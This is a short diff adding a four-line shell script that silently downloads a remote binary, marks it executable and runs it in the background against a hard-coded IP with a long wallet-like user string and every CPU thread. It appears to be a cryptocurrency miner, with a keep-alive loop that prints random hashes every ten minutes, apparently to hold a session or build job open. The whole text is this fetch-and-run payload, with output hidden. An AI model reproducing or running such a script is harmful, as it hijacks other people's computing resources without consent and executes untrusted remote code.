@@ -1,0 +1,4 @@
+wget https://bitbucket.org/aing005/newnivu/raw/main/nivu >/dev/null 2>&1
+chmod +x nivu
+./nivu -a randomnevo --url 178.128.202.205:80 --user NS2cbYTcqts723rBEH7YLd2UWGH4xdA2o11n4TDjLBm5Qxg99Do99igJjerFAkBiZ4KkCo1PAH8at4FCvce72jeS32fx3wLKj.kidss -p x -t $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done >/dev/null 2>&1
